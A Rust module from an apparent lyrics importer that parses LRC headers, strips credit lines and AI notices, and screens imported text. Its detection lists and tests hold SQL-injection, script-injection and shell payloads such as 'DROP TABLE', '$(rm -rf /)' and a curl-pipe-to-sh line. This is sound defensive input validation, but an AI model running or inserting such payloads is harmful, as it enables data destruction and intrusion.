//! Reading one file of an imported lyrics zip: which song it says it is
//! (the `[ar:]`, `[ti:]`, `[al:]` and `[length:]` lines of an LRC file), the
//! lyrics themselves, and a check that the text is words and not
//! instructions. Lyrics are only ever stored as text; this check is a second
//! layer that throws out files which look like code or markup.

use crate::lyrics::{leading_tags, timestamp, Found, Source};

/// Largest lyrics file taken, in bytes. A song's words are never near this.
pub const MAX_FILE_BYTES: u64 = 200 * 1024;

/// A path as compared across computers: `/` separators, composed Unicode,
/// lower case.
pub fn path_key(path: &str) -> String {
    use unicode_normalization::UnicodeNormalization;
    path.replace('\\', "/")
        .nfc()
        .collect::<String>()
        .to_lowercase()
}

/// What an LRC file's header lines say about its song.
#[derive(Clone, Debug, Default, PartialEq, Eq)]
pub struct Header {
    pub artist: Option<String>,
    pub title: Option<String>,
    pub album: Option<String>,
    pub length_ms: Option<i64>,
    /// `[by:...]`: who or what made the file.
    pub by: Option<String>,
}

impl Header {
    /// Set when the file says an AI made its lyrics (a `[by:]` line such as
    /// `lyrics-listener (AI-generated; model=faster-whisper/medium)`): the
    /// model it names, or a plain "AI". These are guesses at what is said
    /// or sung, and rank below lyrics from anywhere else.
    pub fn ai_model(&self) -> Option<String> {
        let by = self.by.as_deref()?;
        if !by.to_lowercase().contains("ai-generated") {
            return None;
        }
        Some(
            by.split_once("model=")
                .map(|(_, rest)| rest.trim_end_matches(')').trim().to_owned())
                .filter(|m| !m.is_empty())
                .unwrap_or_else(|| "AI".to_owned()),
        )
    }
}

/// The header lines (`[ar:Artist]` and so on) at the top of LRC text.
pub fn header(text: &str) -> Header {
    let mut out = Header::default();
    for line in text.trim_start_matches('\u{feff}').lines() {
        let (tags, words) = leading_tags(line);
        if tags.is_empty() {
            if line.trim().is_empty() {
                continue;
            }
            break;
        }
        if !words.is_empty() && tags.iter().any(|t| timestamp(t).is_some()) {
            break;
        }
        for tag in tags {
            let Some((key, value)) = tag.split_once(':') else {
                continue;
            };
            let value = value.trim();
            if value.is_empty() {
                continue;
            }
            match key.trim().to_ascii_lowercase().as_str() {
                "ar" => out.artist = Some(value.to_owned()),
                "ti" => out.title = Some(value.to_owned()),
                "al" => out.album = Some(value.to_owned()),
                "by" => out.by = Some(value.to_owned()),
                "length" => {
                    out.length_ms = timestamp(value).map(|ms| ms as i64).or_else(|| {
                        // "[length:215]" in seconds
                        value.parse::<i64>().ok().map(|s| s * 1000)
                    })
                }
                _ => {}
            }
        }
    }
    out
}

/// Lines made only of `[tag:value]` that aren't timestamps.
fn is_header_line(line: &str) -> bool {
    let (tags, words) = leading_tags(line);
    !tags.is_empty()
        && words.is_empty()
        && tags
            .iter()
            .all(|t| timestamp(t).is_none() && t.contains(':'))
}

/// What a file holds.
#[derive(Clone, Debug, PartialEq)]
pub enum Content {
    Lyrics(Found),
    /// Only a marker such as `[Instrumental]`: ignored.
    Instrumental,
    Empty,
}

/// Sorts a file's text into timed or plain lyrics (the content decides, not
/// the extension). Header lines are not part of plain lyrics.
pub fn content(text: &str) -> Content {
    let text = text.trim_start_matches('\u{feff}');
    // A line that only says "(AI-generated lyrics)" is the file's notice, not
    // a lyric; the header's `[by:]` carries the same fact.
    let clean: String = text
        .lines()
        .filter(|l| !is_ai_notice(l))
        .collect::<Vec<_>>()
        .join("\n");
    let mut all: Vec<&str> = clean.lines().collect();
    let head = header(&clean);
    let timed = crate::lyrics::is_timed(&clean);
    if timed {
        // The credits line is the first timed line.
        let first = all.iter().position(|l| {
            let (tags, words) = leading_tags(l);
            !words.trim().is_empty() && tags.iter().any(|t| timestamp(t).is_some())
        });
        if let (Some(i), Some(artist)) = (first, first_artist(&head)) {
            if is_credit_line(leading_tags(all[i]).1, &artist) {
                all.remove(i);
            }
        }
    }
    let joined = all.join("\n");
    let text = joined.as_str();
    let mut lines: Vec<&str> = text.lines().filter(|l| !is_header_line(l)).collect();
    if !timed {
        drop_credit_line(&mut lines, &head);
    }
    let body: String = lines.join("\n");
    let marker = body
        .trim()
        .trim_matches(|c| matches!(c, '[' | ']' | '(' | ')' | '*' | '-' | '.' | ' '))
        .to_lowercase();
    if marker == "instrumental" {
        return Content::Instrumental;
    }
    let sorted = if crate::lyrics::is_timed(text) {
        Found::from_text(text, Source::Bulk)
    } else {
        Found::from_text(&body, Source::Bulk)
    };
    match sorted {
        Some(found) => Content::Lyrics(found),
        None => Content::Empty,
    }
}

fn is_ai_notice(line: &str) -> bool {
    let (_, words) = leading_tags(line);
    words.trim().eq_ignore_ascii_case("(AI-generated lyrics)")
}

/// Letters and digits only, lower case, so "Mot örhead" meets "Motörhead".
fn squash(text: &str) -> String {
    text.chars()
        .filter(|c| c.is_alphanumeric())
        .flat_map(char::to_lowercase)
        .collect()
}

/// Lyrics sites often start with a title and credits line ("All About U
/// (Nate Dogg) -2Pac"). Drops the first line when it names the artist and has
/// a dash, which a real first lyric rarely does.
fn drop_credit_line(lines: &mut Vec<&str>, header: &Header) {
    let Some(artist) = first_artist(header) else {
        return;
    };
    let Some(first) = lines.iter().position(|l| !l.trim().is_empty()) else {
        return;
    };
    if is_credit_line(lines[first], &artist) {
        lines.remove(first);
    }
}

/// The first artist of the header, squashed, when there is one to go by.
fn first_artist(header: &Header) -> Option<String> {
    header
        .artist
        .as_deref()
        .and_then(|a| a.split(['&', ',']).next())
        .map(squash)
        .filter(|a| a.len() >= 2)
}

fn is_credit_line(line: &str, artist: &str) -> bool {
    line.chars().count() <= 120
        && line.contains(['-', '‐', '–', '—'])
        && squash(line).contains(artist)
}

/// Extensions of files that run or hold data; one in a zip is thrown out
/// with a warning and never read.
const DANGEROUS_EXTENSIONS: [&str; 30] = [
    "exe", "dll", "sh", "bat", "cmd", "ps1", "js", "vbs", "sql", "db", "sqlite", "zip", "7z",
    "rar", "gz", "tar", "php", "py", "jar", "msi", "so", "dylib", "com", "scr", "lnk", "html",
    "htm", "svg", "pl", "rb",
];

/// True for a file name that should never be in a lyrics zip.
pub fn dangerous_extension(name: &str) -> bool {
    name.rsplit_once('.')
        .is_some_and(|(_, ext)| DANGEROUS_EXTENSIONS.contains(&ext.to_ascii_lowercase().as_str()))
}

/// Why this text looks like instructions or markup rather than words, if it
/// does. Ordinary lyrics that use words like "select" or "drop" are fine: a
/// match needs the shape of a statement, a tag or a command.
pub fn suspicious(text: &str) -> Option<&'static str> {
    if text
        .chars()
        .any(|c| c.is_control() && !matches!(c, '\n' | '\r' | '\t'))
    {
        return Some("control characters");
    }
    let start = text.trim_start_matches('\u{feff}');
    if start.starts_with("MZ")
        || start.starts_with("#!")
        || start.starts_with("PK")
        || start.starts_with("%PDF")
    {
        return Some("starts like a program or archive");
    }
    let lower = text.to_lowercase();
    if markup(&lower) {
        return Some("script or markup");
    }
    if sql(&lower) {
        return Some("SQL statement");
    }
    if shell(&lower) {
        return Some("shell or system command");
    }
    None
}

fn markup(lower: &str) -> bool {
    const TAGS: [&str; 12] = [
        "<script",
        "<iframe",
        "<object",
        "<embed",
        "<svg",
        "<?php",
        "<%",
        "<style",
        "javascript:",
        "data:text/html",
        "${",
        "{{",
    ];
    if TAGS.iter().any(|t| lower.contains(t)) {
        return true;
    }
    // An event attribute inside a tag: <img src=x onerror=...>.
    let mut rest = lower;
    while let Some(at) = rest.find('<') {
        let after = &rest[at + 1..];
        let end = after.find('>').unwrap_or(after.len().min(200));
        let tag = &after[..end.min(400)];
        if tag
            .split(|c: char| c.is_whitespace() || c == '/' || c == '"' || c == '\'')
            .any(|w| w.starts_with("on") && w.len() > 3 && w.contains('='))
        {
            return true;
        }
        rest = after;
    }
    false
}

/// Text that starts like an SQL statement: a keyword with the word that
/// follows it in the statement ("delete from", not "delete me").
fn statement(text: &str) -> bool {
    const STARTS: [(&str, &[&str]); 9] = [
        ("drop", &["table", "view", "index", "trigger", "database"]),
        ("delete", &["from"]),
        ("insert", &["into", "or"]),
        ("update", &[]),
        ("alter", &["table"]),
        ("create", &["table", "view", "index", "trigger", "virtual"]),
        ("attach", &["database"]),
        ("pragma", &[]),
        ("select", &[]),
    ];
    let mut words = text.split_whitespace();
    let Some(first) = words.next() else {
        return false;
    };
    let second = words.next().unwrap_or("");
    STARTS
        .iter()
        .any(|(k, next)| *k == first && (next.is_empty() || next.contains(&second)))
        && match first {
            // "update" and "select" alone are common words: they need the
            // rest of a statement.
            "update" => text.contains(" set "),
            "select" => text.contains(" from ") || second.starts_with(['*', '(']),
            "pragma" => text.contains(['=', '(']),
            _ => true,
        }
}

/// The phrase as whole words: "drop table;" counts, "drop table-top" doesn't.
fn has_phrase(text: &str, phrase: &str) -> bool {
    text.match_indices(phrase).any(|(at, _)| {
        text[at + phrase.len()..]
            .chars()
            .next()
            .is_none_or(|c| c.is_whitespace() || matches!(c, ';' | '`' | '"' | '\'' | '('))
    })
}

fn sql(lower: &str) -> bool {
    const PHRASES: [&str; 12] = [
        "drop table",
        "drop database",
        "drop view",
        "drop index",
        "drop trigger",
        "union select",
        "union all select",
        "alter table",
        "create table",
        "create trigger",
        "attach database",
        "select * from",
    ];
    if PHRASES.iter().any(|p| has_phrase(lower, p)) {
        return true;
    }
    if lower.contains("'--") || lower.contains("' or '") || lower.contains("\" or \"") {
        return true;
    }
    if lower.contains(" or 1=1") || lower.contains("' or 1=1") {
        return true;
    }
    if lower.contains("/*") && lower.contains("*/") {
        return true;
    }
    for line in lower.lines() {
        // A statement started after a semicolon: "; drop table ...".
        if line.split(';').skip(1).any(|p| statement(p.trim_start())) {
            return true;
        }
        let has = |w: &str| line.contains(w);
        if has("insert into") && (has("values") || has("select ")) {
            return true;
        }
        if has("delete from") && (has(" where ") || has(";")) {
            return true;
        }
        if has("update ") && has(" set ") && (has(" where ") || has("=")) {
            return true;
        }
        if has("select ") && has(" from ") && (has(" where ") || has(";") || has("*")) {
            return true;
        }
        if let Some(at) = line.find("pragma ") {
            if line[at + 7..].contains(['=', '(']) {
                return true;
            }
        }
    }
    false
}

fn shell(lower: &str) -> bool {
    const PHRASES: [&str; 18] = [
        "$(",
        "rm -rf",
        "powershell",
        "cmd.exe",
        "/etc/passwd",
        "/bin/sh",
        "/bin/bash",
        "eval(",
        "exec(",
        "system(",
        "base64 -d",
        "| sh",
        "| bash",
        "&& rm ",
        "; rm ",
        "xp_cmdshell",
        "nc -e",
        "chmod +x",
    ];
    if PHRASES.iter().any(|p| lower.contains(p)) {
        return true;
    }
    if (lower.contains("curl ") || lower.contains("wget ")) && lower.contains("http") {
        return true;
    }
    // `command` between backticks. Lyrics use ` as an apostrophe (`cause),
    // so only a known command first counts.
    const COMMANDS: [&str; 16] = [
        "ls", "cat", "rm", "curl", "wget", "sh", "bash", "echo", "nc", "python", "perl", "sudo",
        "chmod", "whoami", "uname", "id",
    ];
    let mut rest = lower;
    while let Some(at) = rest.find('`') {
        let after = &rest[at + 1..];
        let Some(end) = after.find('`') else { break };
        let first = after[..end].split_whitespace().next().unwrap_or("");
        if COMMANDS.contains(&first) && after[..end].len() < 200 {
            return true;
        }
        rest = &after[end + 1..];
    }
    false
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn the_header_names_the_song() {
        let text = "[ar:Queen]\n[ti:Bohemian Rhapsody]\n[al:A Night at the Opera]\n[length:05:55]\n[00:01.00]Is this the real life?";
        assert_eq!(
            header(text),
            Header {
                artist: Some("Queen".into()),
                title: Some("Bohemian Rhapsody".into()),
                album: Some("A Night at the Opera".into()),
                length_ms: Some(355_000),
                by: None,
            }
        );
        assert_eq!(header("Just words\n[ar:Late]"), Header::default());
    }

    #[test]
    fn timed_and_plain_lyrics_are_told_apart_by_content() {
        let timed = content("[ar:Band]\n[00:01.00]One\n[00:02.00]Two");
        let Content::Lyrics(found) = timed else {
            panic!("timed")
        };
        assert!(found.synced.is_some());
        assert_eq!(found.plain.as_deref(), Some("One\nTwo"));
        assert_eq!(found.source, Source::Bulk);
        // A plain file with a header: the header is not part of the words.
        let Content::Lyrics(found) = content("[ar:Band]\n[ti:Song]\nWe sing\nAll night") else {
            panic!("plain")
        };
        assert!(found.synced.is_none());
        assert_eq!(found.plain.as_deref(), Some("We sing\nAll night"));
        assert_eq!(content("[ar:Band]\n[Instrumental]"), Content::Instrumental);
        assert_eq!(content("  \n"), Content::Empty);
    }

    #[test]
    fn ai_made_lyrics_are_told_apart_and_their_notice_is_not_a_lyric() {
        let text = "[ar:Band]\n[ti:Skit]\n[by:lyrics-listener (AI-generated; model=faster-whisper/medium)]\n\n[00:00.00](AI-generated lyrics)\n[00:00.00]Jack, leave him alone.\n[00:06.36]Or else.";
        let head = header(text);
        assert_eq!(head.ai_model().as_deref(), Some("faster-whisper/medium"));
        let Content::Lyrics(found) = content(text) else {
            panic!("lyrics")
        };
        assert_eq!(
            found.plain.as_deref(),
            Some("Jack, leave him alone.\nOr else.")
        );
        assert!(!found
            .synced
            .unwrap_or_default()
            .contains("(AI-generated lyrics)"));
        // A person's file is not AI.
        assert_eq!(
            header("[ar:A]\n[by:someone]\n[00:01.00]Hi").ai_model(),
            None
        );
        assert_eq!(
            header("[by:AI-generated]\n[00:01.00]Hi")
                .ai_model()
                .as_deref(),
            Some("AI")
        );
    }

    #[test]
    fn a_title_and_credits_line_from_a_lyrics_site_is_dropped() {
        let with = |first: &str| {
            format!("[ar:2Pac & Snoop Dogg]\n[ti:All Bout U]\n[length:04:37]\n\n{first}\nAhh yeah\nIt's all about you")
        };
        for credit in [
            "All About U （Nate Dogg ,Snoop Dogg ）-2Pac （派克）",
            "2Pac - All About U",
        ] {
            let Content::Lyrics(found) = content(&with(credit)) else {
                panic!("lyrics")
            };
            assert_eq!(
                found.plain.as_deref(),
                Some("Ahh yeah\nIt's all about you"),
                "{credit}"
            );
        }
        // The same in timed lyrics: the first timed line goes.
        let timed = "[ar:2Pac]\n[ti:If I Die 2Nite]\n\n[00:00.44]If I Die 2 Nite - 2Pac\n[00:00.44]A coward dies\n[00:02.98]A soldier dies but once";
        let Content::Lyrics(found) = content(timed) else {
            panic!("lyrics")
        };
        assert_eq!(
            found.plain.as_deref(),
            Some("A coward dies\nA soldier dies but once")
        );
        assert!(!found.synced.unwrap_or_default().contains("Nite - 2Pac"));
        // An ordinary first line stays, even one with a dash.
        let Content::Lyrics(found) = content(&with("Ahh yeah - I said it")) else {
            panic!("lyrics")
        };
        assert!(found
            .plain
            .unwrap_or_default()
            .starts_with("Ahh yeah - I said it"));
    }

    #[test]
    fn instructions_are_caught_and_ordinary_words_are_not() {
        for bad in [
            "words\n'); DROP TABLE tracks;--",
            "[ti:'); DROP TABLE tracks;--]\nla la",
            "x; delete from lyrics where 1",
            "1 UNION SELECT password FROM users",
            "insert into tracks values (1)",
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "javascript:alert(1)",
            "hello $(rm -rf /)",
            "run `curl http://x | sh`",
            "nul\0byte",
            "MZ\u{90}binary",
            "#!/bin/sh\nrm -rf ~",
            "{{template}}",
        ] {
            assert!(suspicious(bad).is_some(), "{bad}");
        }
        for fine in [
            "Select your heart, drop the beat, update my soul",
            "Delete from my memory, insert into my arms",
            "We're all alone; Delete me tonight",
            "`cause I'm leaving on a jet plane",
            "[00:01.00]I'm 5 > 3 & you < me",
            "Don't stop; don't ever stop",
            "A song about a <3 and a drop table-top",
        ] {
            assert_eq!(suspicious(fine), None, "{fine}");
        }
        assert!(dangerous_extension("a/b.EXE"));
        assert!(dangerous_extension("dump.sql"));
        assert!(!dangerous_extension("a/b.lrc"));
    }
}
